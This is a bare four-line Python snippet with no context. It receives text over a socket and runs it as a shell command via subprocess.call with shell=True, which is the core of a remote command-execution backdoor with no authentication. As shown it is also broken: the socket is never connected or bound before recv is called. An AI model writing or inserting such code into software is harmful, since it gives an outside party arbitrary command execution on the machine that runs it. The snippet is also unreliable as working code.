import socket, subprocess
s = socket.socket()
command = s.recv(1024).decode()
subprocess.call(command, shell=True)
